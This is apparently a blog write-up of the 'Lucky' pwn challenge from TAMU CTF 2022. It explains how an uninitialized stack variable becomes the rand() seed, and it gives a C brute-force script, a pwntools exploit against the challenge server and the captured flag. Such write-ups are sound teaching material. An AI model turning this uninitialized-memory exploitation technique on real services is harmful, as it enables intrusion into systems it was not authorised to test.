---
title: "[Pwn] Lucky [Tamu CTF 2022]"
date: 2022-04-17 16:39:00
---

# 0x0 Introduction

Author: nhwn

Feeling lucky? I have just the challenge for you :D

SNI: lucky

files: [lucky](lucky), [lucky.c](lucky.c)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 0x2 Vulnerability

The basic idea is set a seed for `rand()` so that 3 key is same as the requirements.

Because both function are called in the main. The function `seed()` and function `welcome` share the same stack address. 

On the other hand, `seed()` just return the value on the stack. In this case, the stack will looks like this.

```
stack for welcome         stack for seed
-------                   -----------------  
buf[4]
buf[8]                    "GLHF :D"
buf[4]                    lol
main stack                main stack
-------                   ---------------
```

Therefore, we can control the value of lol (which is the seed) by write last 4 bytes in function `welcome`/

now, we just need to find the correct seed by using the script below

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    for (int i = 0; i <= 2147483647; i++)
    {
        srand(i);
        int key0 = rand() == 306291429;
        int key1 = rand() == 442612432;
        int key2 = rand() == 110107425;
        if (key0 && key1 && key2)
        {
            printf("%d",i);
            break;
        }
    }
}
```


# 0x3 Exploit

```
from pwn import *

context.binary = ELF("lucky")
io = remote("tamuctf.com", 443, ssl=True, sni="lucky")
io.sendlineafter('name: ',flat({
    0xc:5649426
}))

io.interactive()
```

# 0x4 Flag

gigem{un1n1t14l1z3d_m3m0ry_15_r4nd0m_r1ght}
